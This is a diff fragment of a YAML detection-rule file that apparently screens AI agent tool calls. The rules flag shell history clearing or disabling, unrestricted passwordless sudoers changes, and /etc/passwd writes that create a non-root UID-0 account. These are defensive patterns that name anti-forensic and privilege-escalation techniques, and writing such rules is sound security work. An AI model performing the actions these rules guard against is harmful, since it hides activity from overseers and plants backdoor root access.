+    tags: [credential, exfiltration, exact-file, detection-only]
   - id: privilege.sudoers_unrestricted_nopasswd
     tool_call_only: true
     # CEL proves an exact executing sudoers mutation. The semantic owner adds
@@ -772,7 +1082,7 @@ rules:
       f.commands.exists(c, c.argv_complete &&
       (c.program == 'history' ||
       (c.program == 'unset' && 'HISTFILE' in c.argv)))
-    pattern: '(?i)(?:\bhistory\b[^;\n]*\s-[acnrw]*c[acnrw]*(?:[\s;&|]|$)|\bunset\b[^;\n]*\bHISTFILE\b)'
+    pattern: '(?i)(?:^|[;&|\r\n]\s*)(?:history\s+-[acnrw]*c[acnrw]*(?:[\s;&|]|$)|unset\b[^;\n]*\bHISTFILE\b)'
     title: "Shell history clear or disable"
     severity: MEDIUM
     confidence: 0.95
@@ -901,3 +1211,14 @@ rules:
     severity: HIGH
     confidence: 0.95
     tags: [persistence, privilege, account]
+  - id: privilege.posix_non_root_uid_zero_account_write
+    tool_call_only: true
+    # The regex lane is intentionally disabled. ActionFacts accepts only a
+    # closed structured write, the exact /etc/passwd target, and complete
+    # literal records containing a non-root username with UID exactly zero.
+    expression: "f.tool in ['write_file', 'write-file', 'writefile']"
+    pattern: 'a^'
+    title: "Non-root UID-0 account written to /etc/passwd"
+    severity: CRITICAL
+    confidence: 0.99
+    tags: [persistence, privilege, account, system-file, structured-tool, bounded-grammar]
